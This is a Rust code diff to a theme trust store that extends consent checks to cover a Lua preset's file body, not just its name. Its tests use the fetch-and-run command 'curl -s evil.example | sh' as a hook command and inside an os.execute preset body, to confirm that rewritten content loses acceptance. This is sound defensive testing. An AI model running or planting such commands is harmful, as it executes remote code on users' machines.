@@ -17,6 +17,14 @@
 //! the recorded content exactly needs none, cannot collide, and leaves an
 //! auditable record of what was actually accepted.
 //!
+//! "The content" means everything that RUNS: a hook's provider, key and
+//! command text, and a preset's category, file name AND BODY. The first
+//! version of this store keyed presets by name alone, and a dual
+//! verification refuted it: the apply copies the preset file as it is on
+//! disk and the assembled overlay `dofile`s it, so keeping the name and
+//! rewriting the body applied arbitrary Lua in silence. That is why the
+//! body is compared, and why the detector reports it.
+//!
 //! Honest limits, stated here and not pretended elsewhere:
 //!
 //! - This is a consent gate, not a sandbox. An accepted theme still runs as
@@ -76,11 +84,19 @@ struct StoredHook {
     command: String,
 }
 
-/// One remembered preset: its category and its file name.
+/// One remembered preset: its category, its file name and the body the
+/// keeper accepted.
+///
+/// `body` is the reason this store is not keyed by names: the apply copies
+/// the preset file as it is ON DISK, so a theme that keeps this name and
+/// rewrites the body runs different code. `None` means the scan could not
+/// read that file in full — such a report is never stored, and a LIVING
+/// report in that state can never equal a stored one.
 #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 struct StoredPreset {
     category: String,
     file_name: String,
+    body: Option<String>,
 }
 
 /// The content of one acceptance: every field of the report that can
@@ -113,6 +129,10 @@ impl Accepted {
                 .map(|p| StoredPreset {
                     category: p.category.clone(),
                     file_name: p.file_name.clone(),
+                    body: match &p.body {
+                        crate::theme_trust::PresetBody::Text(text) => Some(text.clone()),
+                        crate::theme_trust::PresetBody::Unreadable(_) => None,
+                    },
                 })
                 .collect(),
         }
@@ -305,7 +325,9 @@ mod tests {
     use std::os::unix::fs::PermissionsExt;
 
     /// The shape a risky theme produces: one hook the provider runs on its
-    /// `started` event, plus one preset the overlay would read.
+    /// `started` event, plus one preset the overlay would read and run.
+    const ACCEPTED_PRESET_BODY: &str = "-- accepted body\n";
+
     fn risky_report() -> ThemeTrustReport {
         ThemeTrustReport {
             shell_hooks: vec![ShellHook {
@@ -316,6 +338,7 @@ mod tests {
             lua_presets: vec![LuaPreset {
                 category: "animations".into(),
                 file_name: "Space.lua".into(),
+                body: crate::theme_trust::PresetBody::Text(ACCEPTED_PRESET_BODY.into()),
             }],
         }
     }
@@ -362,20 +385,30 @@ mod tests {
             }],
             lua_presets: risky_report().lua_presets,
         };
-        let preset = |category: &str, file_name: &str| ThemeTrustReport {
+        let preset = |category: &str, file_name: &str, body: &str| ThemeTrustReport {
             shell_hooks: risky_report().shell_hooks,
             lua_presets: vec![LuaPreset {
                 category: category.into(),
                 file_name: file_name.into(),
+                body: crate::theme_trust::PresetBody::Text(body.into()),
             }],
         };
+        const BODY: &str = ACCEPTED_PRESET_BODY;
 
         for (what, changed) in [
             ("the command", hook("started", "curl -s evil.example | sh", "noctalia-v5")),
             ("the event key", hook("shutdown", "sddm-watch.sh", "noctalia-v5")),
             ("the provider", hook("started", "sddm-watch.sh", "other-v1")),
-            ("the preset file", preset("animations", "Evil.lua")),
-            ("the preset category", preset("borders", "Space.lua")),
+            ("the preset file", preset("animations", "Evil.lua", BODY)),
+            ("the preset category", preset("borders", "Space.lua", BODY)),
+            // The BLOCKER the dual verification refuted: the BODY is part of
+            // the acceptance, because the apply copies this file as it is on
+            // disk and the overlay runs it. Same name, same category, other
+            // code — a different package.
+            (
+                "the preset body",
+                preset("animations", "Space.lua", "os.execute(\"curl -s evil.example | sh\")\n"),
+            ),
         ] {
             assert!(
                 !store.accepts("Risky", &changed),
@@ -510,6 +543,49 @@ mod tests {
         assert!(
             !path.exists(),
             "an uninspected report must leave no record at all"
+        );
+    }
+
+    /// The BLOCKER the W2c dual verification refuted, as a first-class test:
+    /// the acceptance must cover a preset's BODY, because the body is what
+    /// runs — the apply copies the file as it is ON DISK and `overlay.lua`
+    /// `dofile`s it, so a theme that keeps its preset NAMES and rewrites
+    /// their content used to apply in silence.
+    #[test]
+    fn rewriting_a_preset_body_makes_it_a_different_acceptance() {
+        let tmp = tempfile::tempdir().unwrap();
+        let theme = tmp.path().join("Risky");
+        let presets = theme
+            .join(crate::theme_presets::PRESETS_DIR)
+            .join("animations");
+        std::fs::create_dir_all(&presets).unwrap();
+        let lua = presets.join("Space.lua");
+        std::fs::write(&lua, "-- innocent body\n").unwrap();
+
+        let accepted = crate::theme_trust::inspect_theme_package(&theme);
+        assert!(
+            !accepted.is_empty(),
+            "the fixture must carry something executable"
+        );
+        let mut store = TrustStore::default();
+        store.remember("Risky", &accepted);
+        assert!(store.accepts("Risky", &accepted));
+
+        // SAME name, SAME category, different payload.
+        std::fs::write(&lua, "os.execute(\"curl -s evil.example | sh\")\n").unwrap();
+        let rewritten = crate::theme_trust::inspect_theme_package(&theme);
+        assert_eq!(
+            rewritten.lua_presets.len(),
+            accepted.lua_presets.len(),
+            "the rewrite must keep the same preset NAMES, or this test proves nothing"
+        );
+        assert!(
+            rewritten.lua_presets[0].file_name == accepted.lua_presets[0].file_name,
+            "same file name is the whole point: the payload is what changed"
+        );
+        assert!(
+            !store.accepts("Risky", &rewritten),
+            "a rewritten preset BODY is a different package: the warning must come back"
         );
     }
 
